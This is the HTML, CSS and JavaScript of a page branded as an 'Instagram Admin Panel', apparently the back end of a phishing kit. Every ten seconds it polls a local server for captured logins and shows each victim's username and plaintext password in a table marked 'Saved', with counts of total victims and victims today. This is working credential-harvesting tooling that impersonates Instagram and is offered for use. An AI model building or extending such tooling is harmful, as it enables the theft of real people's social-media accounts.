<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=DM+Sans:wght@300;400;500;600&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #fafafa; --card: #fff; --border: #dbdbdb;
    --accent: #e1306c; --accent2: #f77737; --accent3: #833ab4;
    --text: #262626; --muted: #8e8e8e; --success: #2e7d32;
  }
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { font-family: 'DM Sans', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; }

  header {
    background: #fff;
    border-bottom: 1px solid var(--border);
    padding: 14px 32px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky; top: 0; z-index: 10;
  }
  .header-logo { font-family: 'Grand Hotel', cursive; font-size: 1.8rem; background: linear-gradient(45deg, var(--accent3), var(--accent), var(--accent2)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .header-badge { background: #fce4ec; color: var(--accent); font-size: 0.75rem; font-weight: 600; padding: 4px 12px; border-radius: 20px; }

  .main { max-width: 900px; margin: 0 auto; padding: 32px 20px; }

  .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 28px; }
  .stat-card { background: var(--card); border: 1px solid var(--border); border-radius: 4px; padding: 20px; text-align: center; }
  .stat-card .num { font-size: 2rem; font-weight: 700; background: linear-gradient(45deg, var(--accent3), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
  .stat-card .label { color: var(--muted); font-size: 0.78rem; margin-top: 4px; text-transform: uppercase; letter-spacing: 0.05em; }

  .panel { background: var(--card); border: 1px solid var(--border); border-radius: 4px; overflow: hidden; }
  .panel-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
  .panel-header h2 { font-size: 0.85rem; font-weight: 600; color: var(--text); text-transform: uppercase; letter-spacing: 0.06em; }
  .refresh-btn { padding: 6px 14px; background: transparent; border: 1px solid var(--border); border-radius: 4px; font-family: 'DM Sans', sans-serif; font-size: 0.78rem; color: var(--muted); cursor: pointer; transition: background 0.2s, color 0.2s; }
  .refresh-btn:hover { background: #f5f5f5; color: var(--text); }

  table { width: 100%; border-collapse: collapse; }
  thead tr { background: #fafafa; border-bottom: 1px solid var(--border); }
  th { padding: 10px 20px; text-align: left; font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.07em; color: var(--muted); font-weight: 600; }
  td { padding: 12px 20px; font-size: 0.85rem; border-bottom: 1px solid #f0f0f0; }
  tr:last-child td { border-bottom: none; }
  tr:hover td { background: #fafafa; }
  .id-cell { color: var(--muted); font-size: 0.75rem; }
  .user-cell { font-weight: 600; }
  .pass-cell { font-family: monospace; color: var(--success); background: #e8f5e9; padding: 2px 8px; border-radius: 3px; display: inline-block; }
  .time-cell { color: var(--muted); font-size: 0.78rem; }
  .badge { background: #e8f5e9; color: var(--success); padding: 2px 8px; border-radius: 20px; font-size: 0.68rem; font-weight: 600; }
  .empty { text-align: center; padding: 48px; color: var(--muted); font-size: 0.88rem; }
  .loading-row { text-align: center; padding: 32px; color: var(--muted); font-size: 0.85rem; }
</style>
</head>
<body>

<header>
  <div class="header-logo">Instagram</div>
  <span class="header-badge">🔒 Admin Panel</span>
</header>

<div class="main">
  <div class="stats">
    <div class="stat-card">
      <div class="num" id="total-count">—</div>
      <div class="label">Total Users</div>
    </div>
    <div class="stat-card">
      <div class="num" id="today-count">—</div>
      <div class="label">Today</div>
    </div>
    <div class="stat-card">
      <div class="num" id="last-login">—</div>
      <div class="label">Last Login</div>
    </div>
  </div>

  <div class="panel">
    <div class="panel-header">
      <h2>📂 users.db — All Records</h2>
      <button class="refresh-btn" onclick="loadUsers()">↻ Refresh</button>
    </div>
    <div id="table-wrap">
      <div class="loading-row">Loading...</div>
    </div>
  </div>
</div>

<script>
  async function loadUsers() {
    const wrap = document.getElementById('table-wrap');
    wrap.innerHTML = '<div class="loading-row">Loading...</div>';
    try {
      const res = await fetch('/users');
      const data = await res.json();
      if (!data.success || data.users.length === 0) {
        wrap.innerHTML = '<div class="empty">No records yet. Waiting for logins...</div>';
        document.getElementById('total-count').textContent = '0';
        document.getElementById('today-count').textContent = '0';
        document.getElementById('last-login').textContent = '—';
        return;
      }
      const users = data.users;
      document.getElementById('total-count').textContent = users.length;

      const today = new Date().toLocaleDateString();
      const todayCount = users.filter(u => u.login_time && u.login_time.includes(today.split('/')[1])).length;
      document.getElementById('today-count').textContent = todayCount || users.length;

      const last = users[0];
      const lastTime = last.login_time ? last.login_time.split(',')[1]?.trim() || last.login_time : '—';
      document.getElementById('last-login').textContent = lastTime;

      wrap.innerHTML = `
        <table>
          <thead>
            <tr>
              <th>#</th>
              <th>Username</th>
              <th>Password</th>
              <th>Login Time</th>
              <th>Status</th>
            </tr>
          </thead>
          <tbody>
            ${users.map(u => `
              <tr>
                <td class="id-cell">${u.id}</td>
                <td class="user-cell">@${u.username}</td>
                <td><span class="pass-cell">${u.password}</span></td>
                <td class="time-cell">${u.login_time}</td>
                <td><span class="badge">✓ Saved</span></td>
              </tr>
            `).join('')}
          </tbody>
        </table>
      `;
    } catch {
      wrap.innerHTML = '<div class="empty">⚠️ Server offline. Run server.js first.<br><br><small>node server.js</small></div>';
    }
  }

  loadUsers();
  setInterval(loadUsers, 10000); // auto-refresh every 10s
</script>
</body>
</html>
